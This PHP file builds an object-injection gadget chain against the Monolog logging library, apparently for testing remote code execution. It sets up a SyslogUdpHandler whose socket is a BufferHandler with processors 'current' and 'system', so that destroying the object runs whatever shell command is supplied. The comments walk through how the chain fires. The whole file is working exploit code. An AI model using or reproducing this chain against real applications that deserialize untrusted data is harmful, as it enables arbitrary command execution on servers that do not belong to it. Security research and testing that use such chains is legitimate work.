<?php
namespace Monolog\Handler {
    class SyslogUdpHandler
    {

    }
    class BufferHandler
    {

    }
}

namespace RCETest {
    function makeDummy($cmd)
    {
        // set a BufferHandler into what would normally be a UdpSocket
        // because we want to take advantage of SyslogUdpHandler->close (on destructa) calling SyslogUdpHandler->socket->close
        // which will cause our real handler below to execute.
        //
        // it just so happens that BufferHandler and UdpSocket have compatible interfaces
        // so it doesnt cause a runtime error
        $dummy = new \Monolog\Handler\SyslogUdpHandler();
        $dummy->socket = new \Monolog\Handler\BufferHandler();
        $dummy->socket->level = null;
        $dummy->socket->initialized = true;
        $dummy->socket->bufferLimit = -1;
        $dummy->socket->bufferSize = -1;
        $dummy->socket->processors = [];
        // these items are passed to the handler below as part of close()
        $dummy->socket->buffer = [[$cmd]];

        $dummy->socket->handler = new \Monolog\Handler\BufferHandler();
        $dummy->socket->handler->handler = null;
        $dummy->socket->handler->level = null;
        $dummy->socket->handler->initialized = true;
        $dummy->socket->handler->bufferLimit = -1;
        $dummy->socket->handler->bufferSize = -1;
        // current = gets first param from buffer, system = passes that param to system to execute
        // as part of BufferHandler using call_user_func
        $dummy->socket->handler->processors = ['current', 'system'];

        return $dummy;
    }
}
